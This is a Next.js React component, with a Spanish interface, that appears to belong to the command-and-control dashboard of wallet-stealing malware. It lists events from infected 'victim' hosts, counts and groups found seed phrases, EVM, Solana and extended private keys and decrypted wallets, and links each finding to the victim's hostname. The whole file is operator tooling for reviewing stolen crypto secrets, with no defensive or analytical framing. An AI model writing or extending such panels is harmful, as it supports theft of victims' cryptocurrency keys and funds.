'use client';
import { useState } from 'react';
import Link from 'next/link';
import { ChevronDown, ChevronRight, RefreshCw } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import type { EventRow } from '@/lib/types';
import { ago } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
import { EventContent } from '@/components/event-content';
import { cn } from '@/lib/cn';

type Group = { key: string; kind: string; taskId: string | null; count: number; firstAt: string; lastAt: string; victim: { id: string; hostname: string } | null; items: EventRow[] };

const tone = (kind: string) => (kind.includes('seed') || kind.includes('secret') || kind.includes('decrypt') ? 'ok' : kind.includes('fail') || kind.includes('error') ? 'bad' : kind.includes('enroll') ? 'brand' : 'default');

function title(group: Group): string {
  if (group.kind === 'secret_found') {
    const secretKind = String(group.items[0]?.data.secret_kind ?? 'secreto');
    const label = secretKind === 'evm-key' ? 'claves EVM' : secretKind === 'xprv' ? 'claves extendidas' : secretKind === 'solana' ? 'claves Solana' : `${secretKind}`;
    return `${group.count} ${label} encontradas`;
  }
  if (group.kind === 'seed_found') return `${group.count} seed${group.count === 1 ? '' : 's'} encontrada${group.count === 1 ? '' : 's'}`;
  if (group.count === 1) return group.kind;
  return `${group.count} × ${group.kind}`;
}

const CHIPS = ['secret_found', 'seed_found', 'task_failed', 'module_degraded', 'artifact_failed', 'enrolled', 'wallet_decrypted'];

export function EventFeed({ kind, victim, limit = 120, filters = false }: { kind?: string; victim?: string; limit?: number; filters?: boolean }) {
  const initial = typeof window === 'undefined' ? new URLSearchParams() : new URLSearchParams(window.location.search);
  const [onlyErrors, setOnlyErrors] = useState(initial.get('onlyErrors') === '1');
  const [expanded, setExpanded] = useState<Record<string, boolean>>({});
  const [page, setPage] = useState<string | null>(null);
  const [active, setActive] = useState(initial.get('kind') ?? '');
  useLiveContext();
  const params = new URLSearchParams({ limit: String(limit) });
  if (victim) params.set('victim', victim);
  if (active) params.set('kind', active);
  if (onlyErrors) params.set('onlyErrors', '1');
  if (page) params.set('cursor', page);
  const { data, loading, error, refresh } = useApi<{ items: EventRow[]; groups: Group[]; counts: Record<string, number>; total: number; next: string | null }>(`/events?${params}`, { pollMs: 15_000 });

  if (loading && !data) return <SkeletonRows rows={8} cols={3} />;
  if (error) return <ErrorState message={error.message} retry={refresh} />;
  const groups = data?.groups ?? [];

  return (
    <div className="space-y-2">
      {filters ? (
        <div className="flex flex-wrap items-center gap-1 border-b border-line/60 pb-2">
          <button className="chip" data-active={!active} onClick={() => { setActive(''); setPage(null); }}>todo {data?.total ?? ''}</button>
          {CHIPS.map((chip) => (
            <button key={chip} className="chip" data-active={active === chip} onClick={() => { setActive(active === chip ? '' : chip); setPage(null); }}>
              {chip} {data?.counts[chip] ?? ''}
            </button>
          ))}
          <button className="chip ml-auto" data-active={onlyErrors} onClick={() => { setOnlyErrors((value) => !value); setPage(null); }}>solo errores</button>
          <Button size="icon" variant="ghost" onClick={refresh} aria-label="Refrescar eventos"><RefreshCw className="h-3 w-3" /></Button>
        </div>
      ) : null}

      {groups.length === 0 ? <Empty title="Sin eventos" hint="La actividad del agente y los hallazgos aparecen aquí, agrupados." /> : (
        <ol className="divide-y divide-line/60">
          {groups.map((group) => {
            const isOpen = expanded[group.key] ?? group.count === 1;
            const secretValues = group.items.some((item) => typeof item.data.value === 'string');
            return (
              <li key={group.key}>
                <button className="flex w-full items-start gap-2 px-3 py-2 text-left hover:bg-panel-2/50" aria-expanded={isOpen} onClick={() => setExpanded((current) => ({ ...current, [group.key]: !isOpen }))}>
                  {isOpen ? <ChevronDown className="mt-0.5 h-3 w-3 shrink-0 text-muted" /> : <ChevronRight className="mt-0.5 h-3 w-3 shrink-0 text-muted" />}
                  <Badge tone={tone(group.kind)}>{group.kind}</Badge>
                  <span className={cn('text-xs text-ink', group.kind === 'secret_found' && 'text-ok')}>{title(group)}</span>
                  {group.taskId ? <span className="font-mono text-2xs text-muted">task {group.taskId.slice(0, 8)}</span> : null}
                  <span className="ml-auto shrink-0 text-2xs text-muted/70">
                    {group.victim ? <Link href={`/victims?select=${group.victim.id}&tab=actividad`} className="text-brand" onClick={(event) => event.stopPropagation()}>{group.victim.hostname}</Link> : 'system'} · {ago(group.lastAt)} ago
                  </span>
                </button>
                {isOpen ? (
                  <div className="space-y-1 pb-2 pl-8 pr-3">
                    {group.items.map((item) => (
                      <div key={item.id} className="rounded border border-line/60 bg-panel/30 px-2 py-1.5">
                        <EventContent kind={item.kind} data={item.data} legacy={item.legacy} />
                        {secretValues ? (
                          <details className="mt-1">
                            <summary className="cursor-pointer text-2xs text-muted">JSON saneado</summary>
                            <pre className="mt-1 max-h-40 overflow-auto whitespace-pre-wrap break-all rounded bg-black/30 p-1.5 font-mono text-2xs text-muted">{JSON.stringify(item.data, null, 2)}</pre>
                          </details>
                        ) : null}
                        <p className="mt-1 text-2xs text-muted/60">{ago(item.createdAt)} ago{item.victim ? ` · ${item.victim.hostname}` : ''}</p>
                      </div>
                    ))}
                  </div>
                ) : null}
              </li>
            );
          })}
        </ol>
      )}
      {data?.next ? <Button size="sm" variant="ghost" onClick={() => setPage(data.next)}>más antiguos</Button> : null}
    </div>
  );
}
